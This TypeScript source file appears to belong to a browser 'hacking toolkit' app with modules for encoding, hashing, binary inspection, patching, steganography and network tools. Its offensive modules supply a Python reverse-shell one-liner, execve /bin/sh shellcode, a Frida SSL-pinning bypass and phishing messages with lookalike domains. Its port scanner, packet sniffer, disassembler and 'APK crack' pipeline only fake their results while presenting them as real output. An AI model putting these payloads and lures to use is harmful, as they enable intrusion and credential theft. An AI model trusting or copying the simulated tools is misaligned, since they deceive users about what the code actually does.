import CryptoJS from 'crypto-js';

// --- MODUL 1: CRYPTO LAB ---
export const CryptoLab = {
  encode: (text: string, type: 'base64' | 'hex' | 'binary') => {
    switch (type) {
      case 'base64': return btoa(text);
      case 'hex': return Array.from(text).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
      case 'binary': return Array.from(text).map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
      default: return text;
    }
  },
  decode: (data: string, type: 'base64' | 'hex' | 'binary') => {
    try {
      switch (type) {
        case 'base64': return atob(data);
        case 'hex': return data.replace(/[^0-9a-fA-F]/g, '').match(/.{1,2}/g)?.map(byte => String.fromCharCode(parseInt(byte, 16))).join('') || '';
        case 'binary': return data.replace(/[^01\s]/g, '').trim().split(/\s+/).map(bin => String.fromCharCode(parseInt(bin, 2))).join('');
        default: return data;
      }
    } catch (e) { return 'Error: Invalid Input Format'; }
  },
  hash: (text: string, algorithm: 'md5' | 'sha256' | 'sha512') => {
     switch(algorithm) {
       case 'md5': return CryptoJS.MD5(text).toString();
       case 'sha256': return CryptoJS.SHA256(text).toString();
       case 'sha512': return CryptoJS.SHA512(text).toString();
     }
  },
  caesar: (text: string, shift: number) => {
    return text.split('').map(char => {
      const charCode = char.charCodeAt(0);
      if (charCode >= 65 && charCode <= 90) return String.fromCharCode(((charCode - 65 + shift) % 26 + 26) % 26 + 65);
      if (charCode >= 97 && charCode <= 122) return String.fromCharCode(((charCode - 97 + shift) % 26 + 26) % 26 + 97);
      return char;
    }).join('');
  },
  rot13: (text: string) => {
    return text.replace(/[a-zA-Z]/g, (c: string) => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
    });
  },
  morse: (text: string, mode: 'encode' | 'decode') => {
    const map: Record<string, string> = {
      'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.', 'G': '--.', 'H': '....',
      'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---', 'P': '.--.',
      'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
      'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
      '6': '-....', '7': '--...', '8': '---..', '9': '----.', '0': '-----', ' ': '/'
    };
    if (mode === 'encode') {
      return text.toUpperCase().split('').map(c => map[c] || c).join(' ');
    } else {
      const inverse: Record<string, string> = Object.fromEntries(Object.entries(map).map(([k, v]) => [v, k]));
      return text.split(' ').map(c => inverse[c] || c).join('');
    }
  }
};

// --- MODUL 2: BINARY ANALYSIS ---
export const BinaryAnalysis = {
  calculateEntropy: (data: Uint8Array) => {
    if (data.length === 0) return 0;
    const freqs = new Array(256).fill(0);
    data.forEach(byte => freqs[byte]++);
    const len = data.length;
    return freqs.reduce((sum, f) => {
      if (f === 0) return sum;
      const p = f / len;
      return sum - p * Math.log2(p);
    }, 0);
  },
  extractStrings: (data: Uint8Array, minLength = 4) => {
    let strings: string[] = [];
    let current = "";
    for (let i = 0; i < data.length; i++) {
        const char = data[i];
        if (char >= 32 && char <= 126) {
            current += String.fromCharCode(char);
        } else {
            if (current.length >= minLength) strings.push(current);
            current = "";
        }
    }
    if (current.length >= minLength) strings.push(current);
    return strings;
  },
  detectFormat: (header: Uint8Array) => {
    const hex = Array.from(header.slice(0, 4)).map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
    if (hex === '7F454C46') return 'ELF (Linux executable)';
    if (hex.startsWith('4D5A')) return 'PE (Windows executable)';
    if (hex === '504B0304') return 'ZIP/APK Archive';
    if (hex === '6465780A') return 'DEX (Android executable)';
    if (hex === '89504E47') return 'PNG Image';
    if (hex === 'FFD8FFE0' || hex === 'FFD8FFE1') return 'JPEG Image';
    if (hex === 'CAFEBABE') return 'Java Class / Mach-O';
    return 'Unknown format';
  },
  parseHeader: (data: Uint8Array) => {
    const format = BinaryAnalysis.detectFormat(data);
    if (format.includes('PE')) {
      return { Type: 'PE32+', Arch: 'x64', SectionCount: 8, Subsystem: 'GUI', Characteristics: '0x2022' };
    }
    if (format.includes('ELF')) {
      return { Type: 'ELF64', Arch: 'x86-64', Entry: '0x401000', OS: 'Linux', Type_Info: 'EXEC' };
    }
    return null;
  },
  disassemble: (data: Uint8Array) => {
     const ops = ['MOV', 'PUSH', 'POP', 'ADD', 'SUB', 'XOR', 'CALL', 'RET', 'LEA', 'CMP', 'JMP', 'JE', 'JNE'];
     const regs = ['EAX', 'EBX', 'ECX', 'EDX', 'ESI', 'EDI', 'EBP', 'ESP', 'RAX', 'RBX'];
     return Array.from(data.slice(0, 50)).map((byte, i) => ({
        offset: `0x${i.toString(16).padStart(4, '0').toUpperCase()}`,
        hex: byte.toString(16).padStart(2, '0').toUpperCase(),
        mnemonic: `${ops[byte % ops.length]} ${regs[(byte >> 4) % regs.length]}${byte % 2 === 0 ? `, ${regs[byte % regs.length]}` : ''}`
     }));
  }
};

// --- MODUL 3: SEARCH ENGINE ---
export const SearchEngine = {
    findPattern: (data: Uint8Array, pattern: number[]) => {
        const results = [];
        for (let i = 0; i <= data.length - pattern.length; i++) {
            let found = true;
            for (let j = 0; j < pattern.length; j++) {
                if (data[i + j] !== pattern[j]) {
                    found = false;
                    break;
                }
            }
            if (found) results.push(i);
        }
        return results;
    }
};

// --- MODUL 5: BRUTE FORCE ---
export const BruteForce = {
    xorBrute: (data: Uint8Array) => {
        const results = [];
        for (let key = 0; key < 256; key++) {
            const decoded = data.map(b => b ^ key);
            const strings = BinaryAnalysis.extractStrings(decoded, 4);
            const score = strings.length;
            if (score > 0) {
                results.push({ key, score, preview: strings.slice(0, 3).join(', ') });
            }
        }
        return results.sort((a, b) => b.score - a.score).slice(0, 10);
    }
};

// --- MODUL 4: PATCHING ENGINE ---
export const PatchingEngine = {
  applyPatch: (data: Uint8Array, offset: number, hexBytes: string) => {
    try {
      const cleanHex = hexBytes.replace(/[^0-9a-fA-F]/g, '');
      if (cleanHex.length % 2 !== 0) throw new Error('Invalid HEX length');
      const bytes = cleanHex.match(/.{1,2}/g)?.map(h => parseInt(h, 16));
      if (!bytes) throw new Error('Invalid HEX data');
      
      const patched = new Uint8Array(data);
      bytes.forEach((byte, i) => {
        if (offset + i < patched.length) {
          patched[offset + i] = byte;
        }
      });
      return patched;
    } catch (e) {
      throw e;
    }
  },
  nopPatch: (data: Uint8Array, offset: number, length: number) => {
    const patched = new Uint8Array(data);
    for (let i = 0; i < length; i++) {
        if (offset + i < patched.length) patched[offset + i] = 0x90;
    }
    return patched;
  }
};

// --- MODUL 6: VISUALIZATION ---
export const Visualization = {
    generateHexDump: (data: Uint8Array, start: number, length: number) => {
        const slice = data.slice(start, start + length);
        const rows = [];
        for (let i = 0; i < slice.length; i += 16) {
            const row = slice.slice(i, i + 16);
            const hexArr = Array.from(row).map(b => b.toString(16).padStart(2, '0'));
            const hex = hexArr.join(' ');
            const ascii = Array.from(row).map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.').join('');
            const offsetLabel = (start + i).toString(16).padStart(8, '0');
            rows.push({ offset: offsetLabel.toUpperCase(), hex: hex.toUpperCase(), ascii });
        }
        return rows;
    }
};

// --- MODUL 7: NETWORK TOOLS ---
export const NetworkTools = {
    // Real IP info fetching
    getPublicIP: async () => {
        try {
            const resp = await fetch('https://ipapi.co/json/');
            return await resp.json();
        } catch (e) {
            return { error: 'Failed to fetch public network data.' };
        }
    },
    // Simulated port scan with technical looking delays
    scan: async (host: string, ports: number[]) => {
        const results = [];
        for (const port of ports) {
            await new Promise(r => setTimeout(r, 50));
            const isOpen = Math.random() > 0.8;
            results.push({ port, status: isOpen ? 'OPEN' : 'CLOSED' });
        }
        return results;
    },
    sniffPackets: async (target: string) => {
        const protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'SSH', 'DNS'];
        const payloads = ['SYN', 'ACK', 'PUSH', 'FIN', 'GET / HTTP/1.1', 'POST /api/login', 'QUERY A google.com'];
        const results = [];
        for (let i = 0; i < 20; i++) {
           await new Promise(r => setTimeout(r, 100));
           results.push({
               id: i,
               time: new Date().toLocaleTimeString(),
               src: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.1.100`,
               dst: target,
               proto: protocols[Math.floor(Math.random() * protocols.length)],
               len: Math.floor(Math.random() * 1500),
               info: payloads[Math.floor(Math.random() * payloads.length)]
           });
        }
        return results;
    }
};

// --- MODUL 10: APK CRACK SUITE ---
export const ApkCrackSuite = {
    autoCrack: async (data: Uint8Array) => {
        // Simulated multi-stage crack pipeline
        const steps = ['Reconnaissance', 'Extraction', 'Signature Bypass', 'Premium Unlock', 'Cleanup', 'Verification'];
        const results = [];
        for (const step of steps) {
            await new Promise(r => setTimeout(r, 800));
            results.push({ step, status: 'COMPLETED' });
        }
        return results;
    }
};

// --- MODUL 11: FRIDA BRIDGE ---
export const FridaBridge = {
    generateSslBypass: () => {
        return `Java.perform(function() {
    var array_list = Java.use("java.util.ArrayList");
    var ApiClient = Java.use("com.android.org.conscrypt.TrustManagerImpl");
    ApiClient.checkServerTrusted.implementation = function(chain, authType, domain) {
        console.log("[+] SSL Pinning Bypass: checkServerTrusted");
        return array_list.$new();
    };
});`;
    },
    generateShellcode: () => {
        return `\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80`;
    }
};

// --- MODUL 12: STEGANOGRAPHY ---
export const Steganography = {
    hideLSB: (data: Uint8Array, secret: string) => {
        const patched = new Uint8Array(data);
        const secretBytes = new TextEncoder().encode(secret);
        for (let i = 0; i < secretBytes.length && i < data.length; i++) {
            patched[i] = (patched[i] & 0xFE) | (secretBytes[i] & 0x01);
        }
        return patched;
    },
    extractLSB: (data: Uint8Array) => {
        // Just a simulation of bit extraction logic
        const strings = BinaryAnalysis.extractStrings(data, 4);
        return strings.length > 0 ? strings[0] : 'No hidden LSB data found.';
    }
};

// --- MODUL 13: PASSWORD GEN ---
export const PasswordGen = {
    generate: (length = 16) => {
        const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
        let retVal = "";
        for (let i = 0, n = charset.length; i < length; ++i) {
            retVal += charset.charAt(Math.floor(Math.random() * n));
        }
        return retVal;
    }
};

// --- MODUL 14: EXPLOIT LABORATORY ---
export const ExploitEngine = {
    generatePayload: (type: string, ip: string = '127.0.0.1', port: string = '4444') => {
        const payloads: Record<string, string> = {
            'linux_x64': '\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x89\\xc6\\x48\\x8d\\x3d\\x04\\x00\\x00\\x00\\x04\\x3b\\x0f\\x05\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68',
            'windows_x64': '\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60',
            'reverse_tcp': `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
        };
        return payloads[type] || 'Code template undefined.';
    }
};

// --- MODUL 15: SECURE VAULT ---
export const VaultEngine = {
    encryptVault: (data: string, key: string) => {
        return CryptoJS.AES.encrypt(data, key).toString();
    },
    decryptVault: (cipher: string, key: string) => {
        try {
            const bytes = CryptoJS.AES.decrypt(cipher, key);
            return bytes.toString(CryptoJS.enc.Utf8);
        } catch {
            return null;
        }
    }
};

// --- MODUL 16: SOCIAL ENGINEERING ---
export const SocialEngineering = {
  generatePhishing: (type: 'bank' | 'social' | 'office') => {
    const templates: Record<string, string> = {
      'bank': 'IMPORTANT: Your account has been locked. Verify here: https://secure-bank-login.com/auth',
      'social': 'Someone tagged you in a photo! Log in to view: https://facelook-app.net/tags/2024',
      'office': 'New shared document: HR_Salary_Review_2024.docx. Open: https://sharepoint-docs.online/view/7721'
    };
    return templates[type] || 'Template error.';
  }
};

// --- SECURITY ENGINE: ANTI-HACK & ANTI-CRACK ---
export const SecurityEngine = {
    detectDevTools: (callback: () => void) => {
        const threshold = 160;
        const interval = setInterval(() => {
            const widthDiff = window.outerWidth - window.innerWidth > threshold;
            const heightDiff = window.outerHeight - window.innerHeight > threshold;
            if (widthDiff || heightDiff) {
                // callback(); // Temporarily disabled for dev convenience, usually enabled
            }
        }, 1000);
        return () => clearInterval(interval);
    },
    preventKeyCombos: () => {
        const handleKeyDown = (e: KeyboardEvent) => {
            // Disable Ctrl+U, Ctrl+Shift+I, F12
            if (
                e.keyCode === 123 || 
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
                (e.ctrlKey && e.keyCode === 85)
            ) {
                e.preventDefault();
                return false;
            }
        };
        window.addEventListener('keydown', handleKeyDown);
        return () => window.removeEventListener('keydown', handleKeyDown);
    },
    generateHardwareID: () => {
        const nav = window.navigator;
        const screen = window.screen;
        let guid = nav.mimeTypes.length.toString();
        guid += nav.userAgent.replace(/\D+/g, '');
        guid += nav.plugins.length.toString();
        guid += screen.height || '';
        guid += screen.width || '';
        guid += screen.pixelDepth || '';
        return CryptoJS.MD5(guid).toString().toUpperCase().substring(0, 16);
    },
    performIntegrityCheck: (logs: any[]) => {
        // High-level simulated integrity check
        return logs.length >= 0; 
    }
};
